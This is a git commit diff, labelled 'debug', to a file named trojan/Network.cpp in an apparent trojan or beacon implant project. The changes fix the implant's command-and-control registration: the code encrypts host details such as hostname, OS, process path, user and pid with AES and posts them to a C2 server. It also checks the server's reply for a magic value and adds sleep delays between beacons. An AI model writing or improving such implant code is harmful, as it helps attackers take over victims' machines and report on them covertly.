b0199ae3dcc8bdec7a9d65b5cba3c77587265909
ganghua233 <1012904886@qq.com>
2024-04-26 18:36:57 +0800

    debug

--- trojan/Network.cpp
+++ trojan/Network.cpp
@@ -181,8 +181,8 @@ void PostBreath() {
         Receive200OK();
     }
 }
-#define RandomU128 Uint128((size_t)(rand()) << 32 | rand(), (size_t)(rand()) << 32 | rand())
 const char *info = "{\"mtdt\":{\"h_name\":\"Desktop-win-99k2\", \"wver\":\"windows 10\", \"arch\":\"x86-64\", \"p_name\":\"D://beacon.exe\", \"uid\":\"admin\", \"pid\":\"9871\"}}";
+#define RandomU128 Uint128((size_t)(rand()) << 32 | rand(), (size_t)(rand()) << 32 | rand())
 void registerC2() {
     int i;
     int base64Len;
@@ -224,7 +224,6 @@ void registerC2() {
     free(base64);
     free(encryptA);
 
-
     // Step.2 接收 C2 发回的 200 OK，查看其中是否存在 0xbeebeebe
     TOTAL_PRINTF("Step.2 Receive 200 OK from C2, check the 0xbeebeebe\n");
     RECV_BUF
@@ -254,6 +253,8 @@ void registerC2() {
     TOTAL_PRINTF("as hex = ");
     a_b1.printHex();
     TOTAL_PRINTF("\n");
+
+    Sleep(config.sleep);
     connectSocket();
     sockSend(buf, len);
 
@@ -280,13 +281,15 @@ void registerC2() {
     TOTAL_PRINTF("Step.5 Post info of the computer.\n");
     char buf2[1024];
     len = strlen(info);
-    memmove(buf, info, len);
-    aes.EncryptData((PBYTE)buf2, &len);
-    int httpLen = sprintf(buf, httpPostHead, len, temp)- 1;
+    memmove(buf2, info, len);
+    globalAES->EncryptData((PBYTE)buf2, &len);
+    int httpLen = sprintf(buf, httpPostHead, len, temp) - 1;
     for(i = 0; i < len; i++) {
         buf[httpLen + i] = buf2[i];
     }
+    httpLen += len;
+    Sleep(config.sleep);
     connectSocket();
-    sockSend(buf, len);
+    sockSend(buf, httpLen);
     CLOSE_SOCK
 }
